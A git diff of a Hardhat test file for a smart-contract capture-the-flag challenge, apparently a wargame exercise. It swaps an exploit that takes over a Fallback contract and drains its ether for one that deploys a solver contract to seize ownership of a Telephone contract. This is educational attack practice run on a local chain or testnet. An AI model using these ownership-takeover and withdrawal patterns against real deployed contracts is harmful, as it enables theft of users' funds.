@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Example Vuln', function () {
+describe('[Challenge] Telephone', function () {
 
     let deployer, attacker;
     
@@ -13,30 +13,25 @@ describe('[Challenge] Example Vuln', function () {
         if (chainID == 5){ // goerli testnet
             /** connect to Dapp in goerli **/
             [attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback');
+            const ContractFactory = await ethers.getContractFactory('Telephone');
             this.target = ContractFactory.attach("");
             
         } else { // local network - hardhat  
             /** local test **/
             [deployer, attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback', deployer);
+            const ContractFactory = await ethers.getContractFactory('Telephone', deployer);
             this.target = await ContractFactory.deploy();
         }
     });
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
-        // Contribute to get into whitelist
-        await this.target.connect(attacker).contribute({value: some_ether});
-        // Takeover the contract's owner by sending some ethers
-        tx = {
-            to: this.target.address,
-            value: some_ether
-        };
-        await attacker.sendTransaction(tx);
-        // Withdraw all ethers in the contract
-        await this.target.connect(attacker).withdraw();
+        const TelephoneSolverFactory = await ethers.getContractFactory('TelephoneSolver', attacker);
+        const TelephoneSolver = await TelephoneSolverFactory.deploy();
+        let changeTX = await TelephoneSolver.callChangeOwner(this.target.address);
+        await changeTX.wait();
+        console.log(`\t owner   : ${await this.target.owner()}`);
+        console.log(`\t attacker: ${attacker.address}`);
     }).timeout(0);
 
     after(async () => {
